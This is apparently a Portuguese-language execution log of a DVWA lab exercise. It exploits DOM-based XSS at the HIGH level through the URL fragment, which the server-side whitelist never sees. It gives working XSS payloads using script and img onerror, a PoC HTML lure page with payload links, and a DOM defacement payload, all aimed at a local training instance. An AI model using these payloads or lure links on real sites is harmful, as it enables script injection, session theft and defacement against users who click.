# DVWA - DOM XSS (High) — Diário de Execução

## Contexto

O objetivo foi explorar a vulnerabilidade de Cross-Site Scripting baseada em DOM (DOM XSS) no nível HIGH do DVWA.

Diferente de outros tipos de XSS, neste caso o ataque ocorre inteiramente no lado do cliente, sem participação direta do servidor.

---

## Funcionamento da aplicação

A aplicação recebe um parâmetro via URL:

```
?default=English
```

O servidor aplica uma whitelist para validar esse valor.

Porém, o código JavaScript da página utiliza:

```
window.location.hash
```

para manipular o DOM.

---

## Ponto crítico

O fragmento da URL:

```
#payload
```

não é enviado ao servidor.

Isso significa que qualquer validação server-side é irrelevante para esse valor.

---

## Exploração

### Payload inicial

```
http://localhost:8080/vulnerabilities/xss_d/?default=English#<script>alert(1)</script>
```

Em alguns navegadores, a tag <script> pode ser bloqueada.

---

### Payload alternativo

```
http://localhost:8080/vulnerabilities/xss_d/?default=English#<img src=x onerror=alert(1)>
```

---

## Resultado

O navegador executa o JavaScript, exibindo:

```
alert(1)
```

---

## Prova de conceito (PoC)

Foi criado um arquivo local para simular um cenário mais realista.

### attack_dom.html

```html
<!DOCTYPE html>
<html>
<head>
    <title>DOM XSS PoC</title>
</head>
<body>

<h2>Click to view content</h2>

<a href="http://localhost:8080/vulnerabilities/xss_d/?default=English#<script>alert(1)</script>">
    Open DVWA and alert
</a>
<br>
<a href="http://localhost:8080/vulnerabilities/xss_d/?default=English#<script>document.body.innerHTML='OWNED'</script>">
    Change title
</a>

</body>
</html>
```

---

## Execução

1. Abrir o arquivo no navegador
2. Clicar no link
3. O payload é executado automaticamente

---

## Prova de impacto

Foi possível manipular completamente o DOM:

```
#<script>document.body.innerHTML="OWNED"</script>
```

Ou versão mais confiável:

```
#<script>document.body.innerHTML='OWNED'</script>
```

---

## Conclusão técnica

A vulnerabilidade ocorre porque:

- o valor do fragmento (#) não é validado pelo servidor
- o JavaScript da aplicação utiliza diretamente esse valor no DOM
- não há sanitização ou escape adequado

---

## Impacto

- execução de código JavaScript arbitrário
- manipulação da interface da aplicação
- possibilidade de roubo de informações sensíveis (cookies, tokens)

---

## Conclusão final

Validações server-side não protegem contra DOM XSS.

A aplicação confia em dados controlados pelo usuário no lado do cliente, permitindo execução de código malicioso.
